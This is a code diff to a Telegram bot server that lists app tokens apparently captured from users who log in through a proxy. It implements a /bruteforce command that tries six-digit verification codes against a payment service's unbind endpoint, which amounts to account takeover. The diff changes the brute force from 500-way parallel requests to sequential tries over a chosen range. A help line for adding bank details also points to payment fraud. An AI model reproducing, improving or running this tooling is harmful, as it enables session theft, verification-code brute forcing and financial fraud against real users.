@@ -693,9 +693,7 @@ app.post('/bot-webhook', async (req, res) => {
 
 === BRUTEFORCE ===
 /bruteforce — Show available tokens
-/bruteforce <token> — Start (500 parallel)
-/bruteforce <token> <concurrency> — Custom parallel
-/bruteforce <token> <conc> <start> <end>
+/bruteforce <token> <start> <end>
 
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
@@ -1127,13 +1125,15 @@ Example:
     if (text.startsWith('/bruteforce')) {
       const parts = text.split(' ');
       const targetToken = parts[1];
-      if (!targetToken) {
+      const startCode = parseInt(parts[2] || '', 10);
+      const endCode = parseInt(parts[3] || '', 10);
+
+      if (!targetToken || isNaN(startCode) || isNaN(endCode)) {
         const userTokens = {};
         if (redis) {
           try {
             const allTokens = await redis.hgetall('ezpayTokenMap');
             if (allTokens && typeof allTokens === 'object') {
-              const entries = Array.isArray(allTokens) ? [] : Object.entries(allTokens);
               if (Array.isArray(allTokens)) {
                 for (let i = 0; i < allTokens.length; i += 2) {
                   const tk = allTokens[i];
@@ -1144,7 +1144,7 @@ Example:
                   }
                 }
               } else {
-                for (const [tk, uid] of entries) {
+                for (const [tk, uid] of Object.entries(allTokens)) {
                   if (tk && uid && tk.length > 10) {
                     if (!userTokens[uid]) userTokens[uid] = [];
                     userTokens[uid].push(tk);
@@ -1161,13 +1161,13 @@ Example:
           }
         }
         const userCount = Object.keys(userTokens).length;
-        let msgs = [`🔓 Bruteforce — ${userCount} users found\n\nUsage:\n/bruteforce <token>\n/bruteforce <token> <concurrency>\n`];
+        let msgs = [`🔓 Bruteforce — ${userCount} users\n\nFormat:\n/bruteforce <token> <start> <end>\n\nExample:\n/bruteforce abc123 656600 656610`];
         for (const [uid, tokens] of Object.entries(userTokens)) {
           const latest = tokens[tokens.length - 1];
           msgs.push(`👤 User: ${uid}\n🔑 Token:\n\`${latest}\``);
         }
         if (userCount === 0) {
-          msgs.push('❌ No tokens found. Users need to login through proxy first.');
+          msgs.push('❌ No tokens. User must login via proxy first.');
         }
         for (const m of msgs) {
           await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' }).catch(() => {
@@ -1177,78 +1177,49 @@ Example:
         return res.sendStatus(200);
       }
 
-      const conc = parseInt(parts[2] || '500', 10);
-      const startCode = parseInt(parts[3] || '0', 10);
-      const endCode = parseInt(parts[4] || '999999', 10);
       const total = endCode - startCode + 1;
-
-      await bot.sendMessage(chatId, `🔓 BRUTEFORCE STARTING\n🔢 Range: ${String(startCode).padStart(6,'0')} → ${String(endCode).padStart(6,'0')} (${total} codes)\n⚡ Concurrency: ${conc}\nToken: ${targetToken.substring(0, 25)}...`);
-
-      let found = false;
-      let tried = 0;
-      let errors = 0;
-      let bfStartTime = Date.now();
-
-      async function tryUnbindCode(code) {
-        if (found) return;
-        const codeStr = String(code).padStart(6, '0');
-        try {
-          const resp = await fetch('https://api.ezpaycenter.com/app/api/memberManager/v2/unbindRobot', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'apptoken': targetToken,
-              'host': 'api.ezpaycenter.com',
-              'accept': 'application/json',
-            },
-            body: JSON.stringify({ verificationCode: codeStr }),
-          });
-          const respText = await resp.text();
-          tried++;
-          let json;
-          try { json = JSON.parse(respText); } catch(e) {}
-
-          if (json && json.status === '200') {
-            found = true;
-            await bot.sendMessage(chatId, `✅ CODE FOUND: ${codeStr}\n\n🎉 Unbind successful!\n📊 Tried: ${tried} codes\n⏱ Time: ${((Date.now() - bfStartTime) / 1000).toFixed(1)}s\n\n📥 Response:\n${respText.substring(0, 1500)}`);
-            return;
-          }
-
-          if (json && json.status !== '600') {
-            await bot.sendMessage(chatId, `⚠️ Unusual status for ${codeStr}: ${json.status} - ${json.message}`);
-            if (json.status === '601') {
-              found = true;
-              await bot.sendMessage(chatId, `🛑 Token expired (601). Bruteforce stopped.`);
-              return;
-            }
-          }
-
-          if (tried % 10000 === 0) {
-            const elapsed = (Date.now() - bfStartTime) / 1000;
-            const rate = tried / elapsed;
-            const remaining = (total - tried) / rate;
-            await bot.sendMessage(chatId, `📊 Progress: ${tried}/${total} (${(tried/total*100).toFixed(1)}%)\n⚡ Rate: ${rate.toFixed(0)}/s\n❌ Errors: ${errors}\n⏱ ETA: ${remaining.toFixed(0)}s`);
-          }
-        } catch(e) {
-          errors++;
-        }
-      }
+      await bot.sendMessage(chatId, `🔓 BRUTEFORCE\n🔢 Range: ${String(startCode).padStart(6,'0')} → ${String(endCode).padStart(6,'0')} (${total} codes)\n🔄 Mode: One by one (sequential)\nToken: ${targetToken.substring(0, 25)}...`);
 
       (async () => {
         try {
-          for (let i = startCode; i <= endCode && !found; i += conc) {
-            const batch = [];
-            for (let j = i; j < i + conc && j <= endCode; j++) {
-              batch.push(tryUnbindCode(j));
+          let found = false;
+          let log = '';
+          for (let i = startCode; i <= endCode; i++) {
+            const codeStr = String(i).padStart(6, '0');
+            try {
+              const resp = await fetch('https://api.ezpaycenter.com/app/api/memberManager/v2/unbindRobot', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                  'apptoken': targetToken,
+                  'host': 'api.ezpaycenter.com',
+                  'accept': 'application/json',
+                },
+                body: JSON.stringify({ verificationCode: codeStr }),
+              });
+              const respText = await resp.text();
+              let json;
+              try { json = JSON.parse(respText); } catch(e) {}
+
+              if (json && json.status === '200') {
+                found = true;
+                log += `✅ ${codeStr} → SUCCESS\n`;
+                await bot.sendMessage(chatId, `✅ CODE FOUND: ${codeStr}\n🎉 Unbind successful!\n\n📥 Response:\n${respText.substring(0, 1500)}`);
+                break;
+              } else if (json && json.status === '601') {
+                log += `🛑 ${codeStr} → TOKEN EXPIRED\n`;
+                await bot.sendMessage(chatId, `🛑 Token expired at code ${codeStr}. Stopped.`);
+                break;
+              } else {
+                log += `❌ ${codeStr} → ${json?.status || '?'} ${json?.message || respText.substring(0, 80)}\n`;
+              }
+            } catch(e) {
+              log += `⚠️ ${codeStr} → Error: ${e.message}\n`;
             }
-            await Promise.all(batch);
           }
-          if (!found) {
-            const elapsed = (Date.now() - bfStartTime) / 1000;
-            await bot.sendMessage(chatId, `❌ Bruteforce complete — no valid code found\n📊 Tried: ${tried}/${total}\n⏱ Time: ${elapsed.toFixed(1)}s\n❌ Errors: ${errors}`);
-          }
+          await bot.sendMessage(chatId, `📋 Results:\n${log}\n${found ? '🎉 Done — code found!' : '❌ No valid code in range.'}`);
         } catch(e) {
-          await bot.sendMessage(chatId, `🛑 Bruteforce error: ${e.message}`).catch(()=>{});
+          await bot.sendMessage(chatId, `🛑 Error: ${e.message}`).catch(()=>{});
         }
       })();
 
